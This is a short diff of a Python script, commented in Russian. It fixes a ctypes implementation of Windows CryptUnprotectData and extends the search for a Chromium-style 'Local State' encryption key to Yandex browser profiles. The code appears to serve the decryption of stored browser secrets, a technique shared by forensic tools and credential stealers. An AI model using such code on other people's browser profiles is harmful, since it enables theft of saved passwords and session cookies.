@@ -55,7 +55,7 @@ def install_dependencies():
 install_dependencies()
 
 # =============================================
-# РЕАЛИЗАЦИЯ CRYPTUNPROTECTDATA ЧЕРЕЗ CTYPES
+# РЕАЛИЗАЦИЯ CRYPTUNPROTECTDATA ЧЕРЕЗ CTYPES (ИСПРАВЛЕННАЯ)
 # =============================================
 class DATA_BLOB(ctypes.Structure):
     _fields_ = [
@@ -82,9 +82,15 @@ def crypt_unprotect_data(encrypted_data):
     ]
     crypt32.CryptUnprotectData.restype = ctypes.wintypes.BOOL
     
+    # Загружаем kernel32.dll для LocalFree
+    kernel32 = ctypes.WinDLL('kernel32.dll')
+    kernel32.LocalFree.argtypes = [ctypes.c_void_p]
+    kernel32.LocalFree.restype = ctypes.c_void_p
+    
     if crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
         decrypted_data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
-        crypt32.LocalFree(blob_out.pbData)
+        # Используем kernel32.LocalFree вместо crypt32.LocalFree
+        kernel32.LocalFree(blob_out.pbData)
         return decrypted_data
     else:
         error_code = ctypes.windll.kernel32.GetLastError()
@@ -496,7 +502,7 @@ def get_encryption_key(profile_path):
         Path(profile_path).parent / "Local State",
         Path(profile_path).parent.parent / "Local State",
         Path(profile_path).parent.parent.parent / "Local State",
-        Path(profile_path).parent.parent.parent.parent / "Local State"
+        Path(profile_path).parent.parent.parent.parent / "Local State"  # Добавлено для Yandex
     ]
     
     local_state_path = None
